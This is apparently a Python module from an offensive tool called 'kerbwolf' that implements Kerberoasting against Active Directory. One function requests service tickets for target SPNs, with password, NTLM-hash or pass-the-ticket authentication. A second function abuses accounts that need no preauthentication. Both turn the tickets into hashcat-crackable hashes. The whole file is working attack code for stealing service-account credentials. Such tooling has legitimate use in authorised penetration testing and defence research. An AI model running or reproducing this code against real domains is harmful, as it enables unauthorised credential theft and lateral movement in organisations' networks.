"""TGS-REP Roast (Kerberoast) - request service tickets and extract hashes.

Supports all 5 Windows encryption types uniformly.  Targets can be
SPNs (``service/host``), sAMAccountNames (``svc_sql``), or UPNs
(``user@domain``).

Authentication: password, NTLM hash, or existing TGT from a ccache file.
"""

from __future__ import annotations

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from impacket.krb5.crypto import Key

import logging

from impacket.krb5.asn1 import AS_REP, TGS_REP
from pyasn1.codec.der import decoder

from kerbwolf.core.asreq import request_asrep_no_preauth, request_tgt
from kerbwolf.core.crypto import ENCTYPE_TABLE
from kerbwolf.core.tgsreq import request_tgs
from kerbwolf.hashcat import format_tgs_hash, tgs_hashcat_mode
from kerbwolf.models import EncryptionType, HashFormat, KDCError, KerberosCredential, RoastResult, TransportProtocol

_log = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Standard TGS-REP Roast (requires authentication)
# ---------------------------------------------------------------------------


def kerberoast(
    cred: KerberosCredential | None = None,
    *,
    dc_ip: str,
    domain: str = "",
    etype: EncryptionType = EncryptionType.RC4_HMAC,
    target_spns: list[str] | None = None,
    hash_format: HashFormat = HashFormat.HASHCAT,
    transport: TransportProtocol = TransportProtocol.TCP,
    timeout: float = 10.0,
    tgt: bytes | None = None,
    tgt_session_key: Key | None = None,
    tgt_cipher_cls: type | None = None,
) -> list[RoastResult]:
    """Request TGS tickets for each target and extract crackable hashes.

    Authentication modes:
    - **Password/hash**: provide *cred* with username + password/nthash.
    - **CCache (pass-the-ticket)**: provide *tgt*, *tgt_session_key*, *tgt_cipher_cls*.

    Targets may be SPNs, sAMAccountNames, or UPNs.
    """
    if not target_spns:
        return []

    realm = domain or (cred.domain if cred else "")

    # Get TGT: either pre-loaded from ccache or fresh from KDC.
    if tgt is not None and tgt_session_key is not None and tgt_cipher_cls is not None:
        raw_tgt, session_key, cipher_cls = tgt, tgt_session_key, tgt_cipher_cls
    elif cred is not None:
        # Authenticate with RC4 for the TGT (always supported).
        # The target etype is used for the TGS request, not the TGT.
        tgt_etype = EncryptionType.RC4_HMAC
        raw_tgt, _client_key, session_key = request_tgt(cred, dc_ip=dc_ip, etype=tgt_etype, transport=transport, timeout=timeout)
        cipher_cls = ENCTYPE_TABLE[session_key.enctype]
    else:
        msg = "Either credentials or a TGT (from ccache) must be provided."
        raise KDCError(error_code=0, message=msg)

    results: list[RoastResult] = []
    for i, target in enumerate(target_spns, 1):
        _log.info("[%d/%d] %s", i, len(target_spns), target)
        try:
            raw_tgs, _new_sk = request_tgs(
                raw_tgt,
                session_key,
                cipher_cls,
                service=target,
                domain=realm,
                dc_ip=dc_ip,
                etypes=(int(etype),),
                transport=transport,
                timeout=timeout,
            )
        except KDCError:
            _log.debug("Skipped %s (KDC error)", target)
            continue
        except Exception:  # noqa: BLE001
            _log.debug("Skipped %s (unexpected error)", target, exc_info=True)
            continue

        decoded = decoder.decode(raw_tgs, asn1Spec=TGS_REP())[0]
        ticket_etype = int(decoded["ticket"]["enc-part"]["etype"])
        _log.debug("[%d/%d] %s → ticket etype %d", i, len(target_spns), target, ticket_etype)
        username = _target_to_display_name(target)
        hash_string = format_tgs_hash(raw_tgs, username, realm.upper(), target, fmt=hash_format)

        results.append(
            RoastResult(
                username=username,
                realm=realm.upper(),
                spn=target,
                etype=ticket_etype,
                hash_string=hash_string,
                hashcat_mode=tgs_hashcat_mode(ticket_etype),
            )
        )

    return results


# ---------------------------------------------------------------------------
# AS-REQ Kerberoast (no authentication required)
# ---------------------------------------------------------------------------


def kerberoast_no_preauth(
    no_preauth_user: str,
    *,
    domain: str,
    dc_ip: str,
    etype: EncryptionType = EncryptionType.RC4_HMAC,
    target_users: list[str] | None = None,
    hash_format: HashFormat = HashFormat.HASHCAT,
    transport: TransportProtocol = TransportProtocol.TCP,
    timeout: float = 10.0,
) -> list[RoastResult]:
    """Request STs directly via AS-REQ using a DONT_REQ_PREAUTH account.

    No credentials needed - the *no_preauth_user* account is used as the
    client; *target_users* are placed in the sname field.
    """
    if not target_users:
        return []

    results: list[RoastResult] = []
    for i, target in enumerate(target_users, 1):
        _log.info("[%d/%d] %s (via %s)", i, len(target_users), target, no_preauth_user)
        try:
            raw_asrep = request_asrep_no_preauth(
                no_preauth_user,
                domain,
                dc_ip=dc_ip,
                etypes=(int(etype),),
                server=target,
                transport=transport,
                timeout=timeout,
            )
        except KDCError:
            _log.debug("Skipped %s (KDC error)", target)
            continue
        except Exception:  # noqa: BLE001
            _log.debug("Skipped %s (unexpected error)", target, exc_info=True)
            continue

        hash_string = format_tgs_hash(raw_asrep, target, domain.upper(), target, fmt=hash_format, is_asreq=True)
        decoded = decoder.decode(raw_asrep, asn1Spec=AS_REP())[0]
        ticket_etype = int(decoded["ticket"]["enc-part"]["etype"])

        results.append(
            RoastResult(
                username=target,
                realm=domain.upper(),
                spn=target,
                etype=ticket_etype,
                hash_string=hash_string,
                hashcat_mode=tgs_hashcat_mode(ticket_etype),
            )
        )

    return results


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _target_to_display_name(target: str) -> str:
    """Extract a display name from an SPN, sAMAccountName, or UPN.

    - ``service/host.domain.com`` → ``host``
    - ``user@domain.com`` → ``user``
    - ``svc_sql`` → ``svc_sql``
    """
    if "/" in target:
        return target.split("/", 1)[1].split(".", maxsplit=1)[0]
    if "@" in target:
        return target.split("@", 1)[0]
    return target
